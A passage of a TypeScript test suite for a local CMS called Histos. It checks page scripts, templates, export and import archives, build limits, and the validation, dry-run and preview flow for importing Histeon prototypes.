    // A post carries its JavaScript too, on its own page of the blog.
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const { post } = await (await fetch(`${projectPath}/posts`, { method: "POST", headers, body: JSON.stringify({ title: "Con script" }) })).json() as { post: { alias: number; headRevision: string; slug: string } };
    expect((await fetch(`${projectPath}/posts/${post.alias}`, { method: "PATCH", headers, body: JSON.stringify({ head: post.headRevision, status: "published", publishedAt: "2026-10-25T10:00:00Z" }) })).status).toBe(200);
    const postDocument = await (await fetch(`${projectPath}/documents/${post.alias}`, { headers })).json() as { content: string; head: string; scriptEditable: boolean };
    expect(postDocument.scriptEditable).toBe(true);
    expect((await fetch(`${projectPath}/documents/${post.alias}`, { method: "POST", headers, body: JSON.stringify({ head: postDocument.head, content: postDocument.content, script: "window.articolo = 1;" }) })).status).toBe(200);
    const rebuilt = await (await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" })).json() as { status: string; previewUrl: string };
    expect(rebuilt.status).toBe("ready");
    const postHtml = await (await fetch(rebuilt.previewUrl.replace(/index\.html$/u, `blog/${post.slug}/index.html`))).text();
    expect(postHtml).toContain('<script type="module">window.articolo = 1;</script></body>');

    const exportResponse = await fetch(`${base}/api/cms/v1/projects/${project.id}/export`, { method: "POST", headers });
    expect(exportResponse.status).toBe(200);
    const { profile: exportedProfile } = await decodeStaticPageArchive(Buffer.from(await exportResponse.arrayBuffer()));
    expect(exportedProfile.manifest.requiredCapabilities).toContain("documents:script:v1");
    expect(exportedProfile.entities.find((entity) => entity.kind === "document" && entity.payload.documentType === "page")?.payload.script).toBe(script);
    expect(exportedProfile.entities.find((entity) => entity.kind === "document" && entity.payload.documentType === "post")?.payload.script).toBe("window.articolo = 1;");
  });

  it("crea, assegna, compila e trasferisce template e parti Histeon", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Template locale" }) });
    const { project } = await created.json() as { project: { id: string } };

    const templateResponse = await fetch(`${base}/api/cms/v1/projects/${project.id}/templates`, { method: "POST", headers, body: JSON.stringify({ title: "Pagina", ref: "site/page" }) });
    expect(templateResponse.status).toBe(201);
    const template = await templateResponse.json() as { id: number; ref: string; head: string; content: string; schema: { props: Record<string, { type: string }> }; documentKind: string };
    expect(template).toMatchObject({ ref: "site/page", documentKind: "template", schema: { props: { page: { type: "object" } } }, content: expect.stringContaining('"name":"default"') });

    const partResponse = await fetch(`${base}/api/cms/v1/projects/${project.id}/template-parts`, { method: "POST", headers, body: JSON.stringify({ title: "Piè di pagina", ref: "site/footer" }) });
    expect(partResponse.status).toBe(201);
    const part = await partResponse.json() as { id: number; ref: string; head: string; schema: unknown };
    const partContent = '<!-- wp:xb/element {"uid":"partroot01","tag":"footer"} --><!-- wp:xb/text {"uid":"parttext01","content":"Footer riutilizzabile"} /--><!-- /wp:xb/element -->';
    const savedPart = await fetch(`${base}/api/cms/v1/projects/${project.id}/documents/${part.id}`, { method: "POST", headers, body: JSON.stringify({ head: part.head, ref: part.ref, schema: part.schema, content: partContent }) });
    expect(savedPart.status).toBe(200);

    const templateContent = '<!-- wp:xb/element {"uid":"tmplhead01","tag":"header"} --><!-- wp:xb/element {"uid":"tmph100001","tag":"h1"} --><!-- wp:xb/text {"uid":"tmptitle001","content":"{props.page.title}"} /--><!-- /wp:xb/element --><!-- /wp:xb/element --><!-- wp:xb/element {"uid":"tmplmain01","tag":"main"} --><!-- wp:xb/slot {"uid":"tmpslot001","name":"default"} /--><!-- /wp:xb/element --><!-- wp:xb/component {"uid":"tmplpart001","ref":"site/footer"} /-->';
    const savedTemplate = await fetch(`${base}/api/cms/v1/projects/${project.id}/documents/${template.id}`, { method: "POST", headers, body: JSON.stringify({ head: template.head, ref: template.ref, schema: template.schema, content: templateContent }) });
    expect(savedTemplate.status).toBe(200);
    const builderConfig = await fetch(`${base}/api/cms/v1/projects/${project.id}/builder-config?document=${template.id}`, { headers });
    expect(builderConfig.status).toBe(200);
    expect(await builderConfig.json()).toMatchObject({ template: { part: false, slug: "site/page", samples: [] } });
    const partBuilderConfig = await fetch(`${base}/api/cms/v1/projects/${project.id}/builder-config?document=${part.id}`, { headers });
    expect(await partBuilderConfig.json()).toMatchObject({ template: { part: true, slug: "site/footer", samples: [] } });

    const details = await (await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers })).json() as { pages: Array<{ id: string; alias: number; title: string; slug: string; status: string; headRevision: string }> ; templates: Array<{ ref: string }>; templateParts: Array<{ ref: string }> };
    expect(details.templates.map(({ ref }) => ref)).toEqual(["site/page"]);
    expect(details.templateParts.map(({ ref }) => ref)).toEqual(["site/footer"]);
    const page = details.pages.find(({ slug }) => slug === "home")!;
    const pageDocument = await (await fetch(`${base}/api/cms/v1/projects/${project.id}/documents/${page.alias}`, { headers })).json() as { content: string };
    const assigned = await fetch(`${base}/api/cms/v1/projects/${project.id}/pages/${page.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: page.headRevision, templateRef: "site/page" }) });
    expect(assigned.status).toBe(200);
    expect(await assigned.json()).toMatchObject({ page: { templateRef: "site/page", status: "published" } });

    const rendered = await fetch(`${base}/api/cms/v1/projects/${project.id}/render`, { method: "POST", headers, body: JSON.stringify({ post_id: page.alias, content: pageDocument.content }) });
    const preview = await rendered.json() as { html?: string; error?: string };
    expect(rendered.status, JSON.stringify(preview)).toBe(200);
    // The canvas's marks: the template's elements say whose they are, a part's elements which part (doc 18 F5).
    expect(preview.html).toMatch(/<footer data-xb-uid="[^"]+" data-xb-part="site\/footer">/u);
    expect(preview.html).toMatch(/<header data-xb-uid="[^"]+" data-xb-template="site\/page">/u);
    preview.html = preview.html?.replace(/ data-xb-(?:uid|part|template)="[^"]*"/gu, "");
    expect(preview.html).toContain("<header><h1>Home</h1></header>");
    expect(preview.html).toContain("Footer riutilizzabile");
    expect(preview.html).toContain("<title>Home</title>");

    const built = await fetch(`${base}/api/cms/v1/projects/${project.id}/build`, { method: "POST", headers, body: "{}" });
    const result = await built.json() as { status: string; previewUrl: string | null; error?: string };
    expect(built.status, JSON.stringify(result)).toBe(200);
    expect(result.status).toBe("ready");
    const builtHtml = await (await fetch(result.previewUrl!)).text();
    expect(builtHtml).toContain("<header><h1>Home</h1></header>");
    expect(builtHtml).toContain("Footer riutilizzabile");

    const exportResponse = await fetch(`${base}/api/cms/v1/projects/${project.id}/export`, { method: "POST", headers });
    expect(exportResponse.status, await exportResponse.clone().text()).toBe(200);
    expect(exportResponse.headers.get("content-type")).toBe("application/zip");
    const archive = Buffer.from(await exportResponse.arrayBuffer());
    const exportedProfile = await decodeStaticPageArchive(archive);
    expect(exportedProfile.profile.manifest.profile).toBe("histos-static-project-v2");
    expect(exportedProfile.profile.manifest.requiredCapabilities).toContain("templates:definition:v1");
    expect(exportedProfile.profile.entities.map((entity) => entity.kind).sort()).toEqual(["document", "styles", "template", "template-part"]);
    expect(exportedProfile.profile.entities.find((entity) => entity.kind === "document" && entity.payload.slug === "home")?.payload.templateRef).toBe("site/page");
    const exportedTemplate = exportedProfile.profile.entities.find((entity) => entity.kind === "template" && entity.payload.ref === "site/page");
    const exportedPart = exportedProfile.profile.entities.find((entity) => entity.kind === "template-part" && entity.payload.ref === "site/footer");
    expect(exportedTemplate).toBeDefined();
    expect(exportedPart).toBeDefined();
    expect(exportedProfile.profile.references).toContainEqual({ ownerId: exportedTemplate!.id, blockUid: "tmplpart001", path: "attrs.ref", targetId: exportedPart!.id, role: "document" });

    const receiverDataDirectory = await mkdtemp(path.join(os.tmpdir(), "histos-cms-template-receiver-data-"));
    const receiverUiDirectory = await mkdtemp(path.join(os.tmpdir(), "histos-cms-template-receiver-ui-"));
    await writeFile(path.join(receiverUiDirectory, "index.html"), "<!doctype html><title>receiver</title>");
    let receiver: LocalServerHandle | null = null;
    try {
      receiver = await startLocalServer({ dataDirectory: receiverDataDirectory, uiDirectory: receiverUiDirectory, openBrowser: false });
      const receiverBase = `http://127.0.0.1:${receiver.port}`;
      const receiverHeaders = { "X-Histos-Token": receiver.token, "Content-Type": "application/zip", Origin: receiverBase };
      const imported = await fetch(`${receiverBase}/api/cms/v1/projects/import`, { method: "POST", headers: receiverHeaders, body: archive });
      expect(imported.status, await imported.clone().text()).toBe(201);
      const importedProject = await imported.json() as {
        project: { id: string };
        pages: Array<{ id: string; alias: number; slug: string; templateRef: string | null }>;
      };
      expect(importedProject.project.id).toBe(project.id);
      expect(importedProject.pages.find(({ slug }) => slug === "home")?.templateRef).toBe("site/page");

      const importedDetails = await fetch(`${receiverBase}/api/cms/v1/projects/${project.id}`, { headers: { ...receiverHeaders, "Content-Type": "application/json" } });
      expect(importedDetails.status).toBe(200);
      const importedCatalog = await importedDetails.json() as {
        templates: Array<{ alias: number; ref: string }>;
        templateParts: Array<{ alias: number; ref: string }>;
      };
      expect(importedCatalog).toMatchObject({ templates: [{ ref: "site/page" }], templateParts: [{ ref: "site/footer" }] });
      const importedTemplateDocument = await fetch(`${receiverBase}/api/cms/v1/projects/${project.id}/documents/${importedCatalog.templates[0]!.alias}`, { headers: { ...receiverHeaders, "Content-Type": "application/json" } });
      const importedPartDocument = await fetch(`${receiverBase}/api/cms/v1/projects/${project.id}/documents/${importedCatalog.templateParts[0]!.alias}`, { headers: { ...receiverHeaders, "Content-Type": "application/json" } });
      expect((await importedTemplateDocument.json() as { content: string }).content).toBe(templateContent);
      expect((await importedPartDocument.json() as { content: string }).content).toBe(partContent);
      const importedPage = importedProject.pages.find(({ slug }) => slug === "home");
      if (!importedPage) throw new Error("La pagina Home non è stata importata.");
      const importedPageDocument = await fetch(`${receiverBase}/api/cms/v1/projects/${project.id}/documents/${importedPage.alias}`, { headers: { ...receiverHeaders, "Content-Type": "application/json" } });
      const importedPageContent = await importedPageDocument.json() as { content: string };
      const importedPreviewResponse = await fetch(`${receiverBase}/api/cms/v1/projects/${project.id}/render`, {
        method: "POST", headers: { ...receiverHeaders, "Content-Type": "application/json" },
        body: JSON.stringify({ post_id: importedPage.alias, content: importedPageContent.content }),
      });
      expect(importedPreviewResponse.status).toBe(200);
      expect(await importedPreviewResponse.json()).toMatchObject({ html: expect.stringContaining("Footer riutilizzabile") });
    } finally {
      if (receiver) await receiver.close();
      await Promise.all([rm(receiverDataDirectory, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }), rm(receiverUiDirectory, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })]);
    }
  });

  it("espone libreria e template nel formato atteso dall’editor Histeon locale", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Libreria builder locale" }) });
    const { project } = await created.json() as { project: { id: string } };
    const root = `${base}/api/cms/v1/projects/${project.id}`;
    const templateResponse = await fetch(`${root}/templates`, { method: "POST", headers, body: JSON.stringify({ title: "Pagina standard", ref: "site/page" }) });
    const template = await templateResponse.json() as { id: number };
    const partResponse = await fetch(`${root}/template-parts`, { method: "POST", headers, body: JSON.stringify({ title: "Intestazione", ref: "site/header" }) });
    const part = await partResponse.json() as { id: number };
    const componentResponse = await fetch(`${root}/components`, { method: "POST", headers, body: JSON.stringify({ title: "Scheda", ref: "cards/item" }) });
    const component = await componentResponse.json() as { id: number };

    expect(templateResponse.status).toBe(201);
    expect(partResponse.status).toBe(201);
    expect(componentResponse.status).toBe(201);
    const templates = await (await fetch(`${root}/templates`, { headers })).json() as { items: Array<{ type: string; id: string; post: number; slug: string; group: string }> };
    expect(templates.items).toEqual(expect.arrayContaining([
      expect.objectContaining({ type: "wp_template", id: expect.any(String), post: template.id, slug: "site/page", group: "templates" }),
      expect.objectContaining({ type: "wp_template_part", id: expect.any(String), post: part.id, slug: "site/header", group: "template-parts" }),
    ]));

    const pages = await (await fetch(`${root}/library?type=page`, { headers })).json() as { items: Array<{ id: number; title: string; status: string; xb: boolean }> };
    expect(pages.items).toContainEqual(expect.objectContaining({ id: 1, title: "Home", status: "draft", xb: true }));
    const components = await (await fetch(`${root}/library?type=wp_block&search=cards/`, { headers })).json() as { items: Array<{ id: number; ref: string; xb: boolean }> };
    expect(components.items).toContainEqual(expect.objectContaining({ id: component.id, ref: "cards/item", xb: true }));
    const unsupportedPosts = await fetch(`${root}/library?type=post`, { headers });
    expect(unsupportedPosts.status).toBe(422);
    expect(await unsupportedPosts.json()).toMatchObject({ code: "cms-capability-unavailable" });
  });

  it("avvisa nel report se il preset Core è stato importato senza il CSS generato", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Preset senza CSS" }) });
    const { project } = await created.json() as { project: { id: string } };
    const root = `${base}/api/cms/v1/projects/${project.id}`;
    const initialStyles = await (await fetch(`${root}/styles`, { headers })).json() as { styles: unknown[]; globals: unknown[]; head: string };
    const emptySheet = { id: "framework-core-framework", css: "", source: { kind: "user-css", frameworkId: "core-framework", name: "Core Framework", version: "2.0.2", license: "MIT", rightsConfirmed: true } };
    const savedEmptySheet = await fetch(`${root}/styles`, { method: "POST", headers, body: JSON.stringify({ styles: initialStyles.styles, globals: [emptySheet], head: initialStyles.head }) });
    expect(savedEmptySheet.status).toBe(200);
    const styleRevision = await savedEmptySheet.json() as { head: string };

    const details = await (await fetch(root, { headers })).json() as { pages: Array<{ alias: number; slug: string; headRevision: string }> };
    const home = details.pages.find((page) => page.slug === "home");
    if (!home) throw new Error("La pagina Home iniziale non è presente.");
    const publishHome = await fetch(`${root}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: home.headRevision }) });
    expect(publishHome.status).toBe(200);

    const firstBuild = await fetch(`${root}/build`, { method: "POST", headers, body: "{}" });
    const firstResult = await firstBuild.json() as { status: string; findings: Array<{ code: string; severity: string; message?: string }> };
    expect(firstBuild.status).toBe(200);
    expect(firstResult.status).toBe("ready");
    expect(firstResult.findings).toContainEqual(expect.objectContaining({ code: "core-framework-css-missing", severity: "warn" }));
    expect(firstResult.findings.find(({ code }) => code === "core-framework-css-missing")?.message).toContain("genera CSS offline solo dai preset Core 1.1.0 supportati");

    const savedCss = await fetch(`${root}/styles`, { method: "POST", headers, body: JSON.stringify({ styles: initialStyles.styles, globals: [{ ...emptySheet, css: ".core-example { display: block; }" }], head: styleRevision.head }) });
    expect(savedCss.status).toBe(200);
    const savedCssRevision = await savedCss.json() as { head: string };
    const secondBuild = await fetch(`${root}/build`, { method: "POST", headers, body: "{}" });
    const secondResult = await secondBuild.json() as { status: string; findings: Array<{ code: string }> };
    expect(secondResult.status).toBe("ready");
    expect(secondResult.findings.some(({ code }) => code === "core-framework-css-missing")).toBe(false);

    const configuration = { format: "opaque-utf8-v1", data: JSON.stringify({ version: "4.0.2", generatedAt: "fixture" }) };
    const savedAcss = await fetch(`${root}/styles`, {
      method: "POST", headers,
      body: JSON.stringify({ styles: initialStyles.styles, globals: [{ id: "framework-automatic-css", css: "", source: { kind: "user-css", frameworkId: "automatic-css", name: "Automatic.css", configuration, rightsConfirmed: true } }], head: savedCssRevision.head }),
    });
    expect(savedAcss.status).toBe(200);
    const savedAcssBody = await savedAcss.json() as { head: string; globals: Array<{ source?: { configuration?: unknown } }> };
    expect(savedAcssBody.globals[0]?.source?.configuration).toEqual(configuration);
    const acssBuild = await fetch(`${root}/build`, { method: "POST", headers, body: "{}" });
    const acssResult = await acssBuild.json() as { status: string; findings: Array<{ code: string; severity: string }> };
    expect(acssBuild.status).toBe(200);
    expect(acssResult.status).toBe("ready");
    expect(acssResult.findings).toContainEqual(expect.objectContaining({ code: "automatic-css-missing", severity: "warn" }));
  });

  it("applica il tetto di route e il timeout senza registrare build incomplete", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    await server.close();
    server = null;
    await startApiServer({ maxRoutes: 1 });
    if (!server) throw new Error("Server di test non riavviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Budget build" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const details = await fetch(projectPath, { headers });
    const home = (await details.json() as { pages: Array<{ alias: number; slug: string; status: string; headRevision: string }> }).pages.find((page) => page.slug === "home");
    if (!home) throw new Error("Home non presente nel progetto di prova.");
    const publishHome = await fetch(`${projectPath}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: home.headRevision }) });
    expect(publishHome.status).toBe(200);
    const createdPage = await fetch(`${projectPath}/pages`, { method: "POST", headers, body: JSON.stringify({ title: "Seconda pagina" }) });
    const { page } = await createdPage.json() as { page: { alias: number; headRevision: string } };
    const publishSecondPage = await fetch(`${projectPath}/pages/${page.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: page.headRevision }) });
    expect(publishSecondPage.status).toBe(200);

    const overLimit = await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" });
    expect(overLimit.status).toBe(422);
    expect(await overLimit.json()).toMatchObject({ code: "cms-build-route-limit" });
    const noPartialBuild = await fetch(`${projectPath}/builds`, { headers });
    expect(await noPartialBuild.json()).toEqual({ builds: [] });

    await server.close();
    server = null;
    await startApiServer({ timeoutMs: 0 });
    if (!server) throw new Error("Server di test non riavviato.");
    const timeoutHeaders = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const timedOut = await fetch(`${base}/api/cms/v1/projects/${project.id}/build`, { method: "POST", headers: timeoutHeaders, body: "{}" });
    expect(timedOut.status).toBe(504);
    expect(await timedOut.json()).toMatchObject({ code: "cms-build-timeout" });
    const noTimedOutBuild = await fetch(`${base}/api/cms/v1/projects/${project.id}/builds`, { headers: timeoutHeaders });
    expect(await noTimedOutBuild.json()).toEqual({ builds: [] });
  });

  it("cambia stato e template di una pagina con richieste separate senza che l'una annulli l'altra", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Campi separati" }) });
    const { project, pages } = await created.json() as { project: { id: string }; pages: Array<{ alias: number; slug: string; headRevision: string; status: string }> };
    const home = pages.find((page) => page.slug === "home")!;
    const pagePath = `${base}/api/cms/v1/projects/${project.id}/pages/${home.alias}`;
    const included = await fetch(pagePath, { method: "PATCH", headers, body: JSON.stringify({ head: home.headRevision, status: "published" }) });
    expect(included.status).toBe(200);
    const untouched = await fetch(pagePath, { method: "PATCH", headers, body: JSON.stringify({ head: home.headRevision, templateRef: null }) });
    expect(untouched.status).toBe(200);
    expect((await untouched.json() as { page: { status: string } }).page.status).toBe("published");
    const invalid = await fetch(pagePath, { method: "PATCH", headers, body: JSON.stringify({ head: home.headRevision, status: "online" }) });
    expect(invalid.status).toBe(400);
  });

  it("importa un prototipo Histeon, lo ricostruisce e lo reimporta senza duplicarlo", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, Origin: base };
    const prototype = readFileSync(new URL("../../cms/test/fixtures/prototipo-esempio.html", import.meta.url));
    const upload = (body: Buffer | string, contentType = "text/html; charset=utf-8") => fetch(`${base}/api/cms/v1/projects/import-prototype`, { method: "POST", headers: { ...headers, "Content-Type": contentType }, body });
    const wrongType = await upload(prototype, "application/zip");
    expect(wrongType.status, await wrongType.clone().text()).toBe(415);
    const invalid = await upload("<!doctype html><html><body></body></html>");
    expect(invalid.status).toBe(422);
    expect(await invalid.json()).toMatchObject({ code: "cms-prototype-invalid" });

    const checkUpload = (body: Buffer | string) => fetch(`${base}/api/cms/v1/projects/import-prototype?check=1`, { method: "POST", headers: { ...headers, "Content-Type": "text/html; charset=utf-8" }, body });
    const checked = await checkUpload(prototype);
    const checkedBody = await checked.json() as { check: boolean; valid: boolean; outcome: string; report: { counts: Record<string, number> } };
    expect(checked.status, JSON.stringify(checkedBody)).toBe(200);
    expect(checkedBody).toMatchObject({ check: true, valid: true, outcome: "create", report: { counts: { pages: 2 } } });
    expect((await (await fetch(`${base}/api/cms/v1/projects`, { headers })).json() as { projects: Array<{ id: string }> }).projects.map((item) => item.id)).not.toContain("3b1f0d2e-6c55-4c1a-9d9e-6a7f6f3f2a10");
    expect((await readdir(dataDirectory)).filter((name) => name.startsWith(".prototype"))).toEqual([]);
    const brokenCheck = await checkUpload(prototype.toString("utf8").replace("<p>Scrivimi.</p>", "<p>Scrivimi.</p>\n  {#if}"));
    expect(brokenCheck.status).toBe(422);
    expect((await brokenCheck.json() as { error: string }).error).toMatch(/page contatti, riga \d+, colonna 3: /u);
    // E4: every problem, each with its place, in one answer and without internal ids.
    const manyBroken = await checkUpload(prototype.toString("utf8").replace("<p>Scrivimi.</p>", '<p onclick="a()">Scrivimi.</p>\n  <marquee>x</marquee>').replace('<section class="hero">', '<section class="hero" onmouseover="b()">'));
    const manyBody = await manyBroken.json() as { error: string; code: string; issues: Array<{ document: string; line: number; message: string }> };
    expect(manyBroken.status).toBe(422);
    expect(manyBody.code).toBe("cms-prototype-invalid");
    expect(manyBody.issues.map((issue) => issue.document)).toEqual(["page home", "page contatti", "page contatti"]);
    expect(manyBody.issues.every((issue) => Number.isInteger(issue.line) && issue.line > 0)).toBe(true);
    expect(manyBody.error).toMatch(/^Il prototipo ha 3 errori:\n1\. page home, riga \d+: /u);
    expect(JSON.stringify(manyBody)).not.toMatch(/segreto rimosso|[0-9a-f]{8}-[0-9a-f]{4}-/u);
    // Past 100 problems: the first 100 listed, and how many there are in all, from the real importer.
    const tooMany = await checkUpload(prototype.toString("utf8").replace("<p>Scrivimi.</p>", Array.from({ length: 150 }, (_, index) => `<p onclick="f${index}()">x</p>`).join("\n")));
    const tooManyBody = await tooMany.json() as { error: string; issues: unknown[]; issuesTotal?: number };
    expect(tooMany.status).toBe(422);
    expect(tooManyBody.issues).toHaveLength(100);
    expect(tooManyBody.issuesTotal).toBe(150);
    expect(tooManyBody.error).toMatch(/^Il prototipo ha 150 errori:/u);
    expect(manyBody).not.toHaveProperty("issuesTotal");
    // A slug of 28 characters or more is the place to fix, not a secret: the list and the message keep it.
    const longSlug = await checkUpload(prototype.toString("utf8").replace('data-slug="contatti"', 'data-slug="storia-della-nostra-associazione"').replace("<p>Scrivimi.</p>", '<p onclick="a()">Scrivimi.</p>'));
    const longSlugBody = await longSlug.json() as { error: string; issues: Array<{ document: string }> };
    expect(longSlug.status).toBe(422);
    expect(longSlugBody.issues.map((issue) => issue.document)).toEqual(["page storia-della-nostra-associazione"]);
    expect(longSlugBody.error).toMatch(/^page storia-della-nostra-associazione, riga \d+: /u);
    expect(JSON.stringify(longSlugBody)).not.toMatch(/segreto rimosso|[0-9a-f]{8}-[0-9a-f]{4}-/u);

    const first = await upload(prototype);
    const created = await first.json() as { project: { id: string; name: string }; report: { counts: Record<string, number>; ignored: unknown[] } };
    expect(first.status, JSON.stringify(created)).toBe(201);
    expect(created.project).toMatchObject({ id: "3b1f0d2e-6c55-4c1a-9d9e-6a7f6f3f2a10", name: "Galleria" });
    expect(created.report.counts).toMatchObject({ pages: 2, posts: 1, templates: 5, records: 2 });
    expect(created.report.ignored.length).toBeGreaterThan(0);
    expect((await readdir(dataDirectory)).filter((name) => name.startsWith(".prototype-"))).toEqual([]);
    // D1: the last import's report stays readable for the project, with every ignored item and warning.
    const reportPath = `${base}/api/cms/v1/projects/${created.project.id}/import-report`;
    const stored = await fetch(reportPath, { headers });
    expect(stored.status).toBe(200);
    expect((await stored.json() as { report: unknown }).report).toMatchObject({ projectId: created.project.id, source: { kind: "app" }, file: null, result: "created", counts: { pages: 2, posts: 1 }, ignored: created.report.ignored, omitted: { ignored: 0 } });
    expect((await fetch(`${base}/api/cms/v1/projects/00000000-0000-4000-8000-000000000000/import-report`, { headers })).status).toBe(404);
    expect((await fetch(reportPath, { method: "POST", headers })).status).toBe(405);

    // D2: an update says what it would change, from a dry run on a copy; the same file changes nothing.
    const same = await (await checkUpload(prototype)).json() as { valid: boolean; outcome: string; existingProject: unknown; changes: { added: unknown[]; modified: unknown[]; removed: unknown[]; keptLocal: unknown[]; conflicts: unknown[]; unchanged: number } };
    expect(same).toMatchObject({ valid: true, outcome: "update", existingProject: { id: created.project.id, name: "Galleria" }, changes: { added: [], modified: [], removed: [], keptLocal: [], conflicts: [] } });
    expect(same.changes.unchanged).toBeGreaterThan(5);
    const newHome = prototype.toString("utf8").replace("<p>Quadretti, libri, racconti.</p>", "<p>Quadretti, libri, racconti e viaggi.</p>");
    const edited = await (await checkUpload(newHome)).json() as { changes: { modified: Array<{ kind: string; label: string }>; added: unknown[]; conflicts: unknown[] } };
    expect(edited.changes).toMatchObject({ modified: [{ kind: "page", label: "Home" }], added: [], conflicts: [] });
    // Nothing was written by the dry run: the original file still changes nothing.
    expect((await (await checkUpload(prototype)).json() as { changes: unknown }).changes).toMatchObject({ modified: [], added: [] });
    // The same page changed in Publish and in the prototype: the update would stop, and the check says where.
    const editing = await new CmsProjectCatalog(dataDirectory).openProject(created.project.id);
    if (!editing) throw new Error("Progetto importato non trovato.");
    try {
      const contacts = editing.store.listPages().find((page) => page.slug === "contatti");
      const head = contacts ? editing.store.getHead(contacts.id) : null;
      if (!contacts || !head) throw new Error("Pagina Contatti non trovata.");
      editing.store.saveDocument({ entityId: contacts.id, expectedHead: head.id, content: head.content.replace("Scrivimi.", "Scrivimi qui.") });
    } finally {
      editing.store.close();
    }
    const clash = await (await checkUpload(prototype.toString("utf8").replace("<p>Scrivimi.</p>", "<p>Scrivimi presto.</p>"))).json() as { changes: { conflicts: Array<{ kind: string; label: string }> } };
    expect(clash.changes.conflicts).toEqual([{ id: expect.any(String), kind: "page", label: "Contatti" }]);
    // Only Publish changed it: the update keeps the user's version.
    expect((await (await checkUpload(prototype)).json() as { changes: unknown }).changes).toMatchObject({ keptLocal: [{ kind: "page", label: "Contatti" }], conflicts: [] });
    // An update from the app needs the user's confirmation (?update=1) and saves the project as it was first.
    const unconfirmed = await upload(prototype);
    expect(unconfirmed.status).toBe(409);
    expect(await unconfirmed.json()).toMatchObject({ code: "cms-import-update-requires-confirmation", project: { id: created.project.id, name: "Galleria" } });
    expect(await readdir(dataDirectory)).not.toContain("backups");
    const again = await fetch(`${base}/api/cms/v1/projects/import-prototype?update=1`, { method: "POST", headers: { ...headers, "Content-Type": "text/html; charset=utf-8" }, body: prototype });
    expect(again.status, await again.clone().text()).toBe(200);
    const backup = (await again.clone().json() as { backup: string }).backup;
    expect(backup).toMatch(/^\d{8}-\d{6}Z-[0-9a-f]{6}\.histosproject$/u);
    expect(await readdir(path.join(dataDirectory, "backups", created.project.id))).toEqual([backup]);
    expect((await (await fetch(reportPath, { headers })).json() as { report: unknown }).report).toMatchObject({ result: "updated", changed: expect.any(Number), keptLocal: 0, unchanged: expect.any(Number) });
    expect((await again.json() as { changed: string[] }).changed.filter((id) => !id.startsWith("3b1f"))).toBeDefined();

    const home = (await (await fetch(`${base}/api/cms/v1/projects/${created.project.id}`, { headers })).json() as { pages: Array<{ slug: string; status: string }> }).pages.find((page) => page.slug === "home");
    expect(home).toMatchObject({ status: "published" });
    const built = await fetch(`${base}/api/cms/v1/projects/${created.project.id}/build`, { method: "POST", headers: { ...headers, "Content-Type": "application/json" }, body: "{}" });
    const build = await built.json() as { status: string; previewUrl: string | null; findings?: unknown };
    expect(built.status, JSON.stringify(build)).toBe(200);
    expect(build.status, JSON.stringify(build.findings)).toBe("ready");
    const root = new URL("./", build.previewUrl!);
    const homeHtml = await (await fetch(root)).text();
    expect(homeHtml).toContain("Studio Ehi");
    expect(homeHtml).toContain("testata");
    expect(await (await fetch(new URL("blog/un-antico-sogno/index.html", root))).text()).toContain("C'era una volta");
    expect((await fetch(new URL("404.html", root))).status).toBe(200);
    // Several imports and builds: under the full suite's load it took close to the 5 s default (round 7).
  }, 30_000);

  it("il controllo con ?preview=1 dà un'anteprima usa-e-getta, mai registrata, che si riapre e poi sparisce (A2)", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, Origin: base };
    const prototype = readFileSync(new URL("../../cms/test/fixtures/prototipo-esempio.html", import.meta.url));
    const check = async (body: Buffer | string = prototype) => {
      const response = await fetch(`${base}/api/cms/v1/projects/import-prototype?check=1&preview=1`, { method: "POST", headers: { ...headers, "Content-Type": "text/html; charset=utf-8" }, body });
      const value = await response.json() as { valid: boolean; outcome: string; preview?: { status: string; buildId?: string; previewUrl?: string; reason?: string } };
      expect(response.status, JSON.stringify(value)).toBe(200);
      return value;
    };
    const reopen = (buildId: string) => fetch(`${base}/api/cms/v1/prototype-previews/${buildId}/preview`, { method: "POST", headers });
    const previewsRoot = path.join(dataDirectory, "histos-cms-builds", ".prototype-previews");

    const checked = await check();
    expect(checked).toMatchObject({ valid: true, outcome: "create", preview: { status: "ready" } });
    const preview = checked.preview as { buildId: string; previewUrl: string };
    const home = await fetch(preview.previewUrl);
    expect(home.status).toBe(200);
    expect(await home.text()).toContain("Studio Ehi");
    expect(await (await fetch(new URL("blog/un-antico-sogno/index.html", preview.previewUrl))).text()).toContain("C'era una volta");
    // Nothing was created: no project, no registered build.
